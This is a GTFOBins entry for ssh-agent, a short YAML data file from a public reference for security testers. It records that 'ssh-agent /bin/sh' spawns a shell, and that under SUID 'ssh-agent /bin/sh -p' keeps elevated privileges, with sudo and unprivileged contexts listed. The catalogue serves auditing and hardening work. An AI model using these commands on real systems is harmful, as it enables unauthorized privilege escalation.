<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ssh-agent -->
---
functions:
  shell:
  - code: |-
      ssh-agent /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          ssh-agent /bin/sh -p
        shell: false
      unprivileged:
...
